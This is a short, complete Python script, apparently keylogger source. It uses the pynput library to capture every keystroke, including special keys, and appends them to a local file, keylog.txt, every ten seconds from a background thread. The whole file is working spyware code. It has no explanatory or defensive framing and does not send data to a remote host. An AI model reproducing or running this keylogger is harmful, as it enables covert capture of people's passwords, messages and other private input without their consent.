from pynput import keyboard
import threading
import time

class Keylogger:
    def __init__(self, interval=10):
        self.log = ""  
        self.filepath = "keylog.txt"  # File to save the keystrokes
        self.interval = interval 
        self.lock = threading.Lock()

    def on_press(self, key):
  
        with self.lock:
            try:
                self.log += key.char
            except AttributeError:
                # Handle special keys
                if key == keyboard.Key.space:
                    self.log += ' '
                elif key == keyboard.Key.enter:
                    self.log += '\n'
                else:
                    self.log += f' [{key}] '

    def save_log(self):
 
        with self.lock:
            with open(self.filepath, 'a') as file:
                file.write(self.log)
                self.log = "" 
    def report(self):
    
        while True:
            time.sleep(self.interval)
            self.save_log()

    def start(self):
     
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()

        report_thread = threading.Thread(target=self.report)
        report_thread.start()

        listener.join()  

if __name__ == "__main__":
    keylogger = Keylogger(interval=10)
    keylogger.start()
   
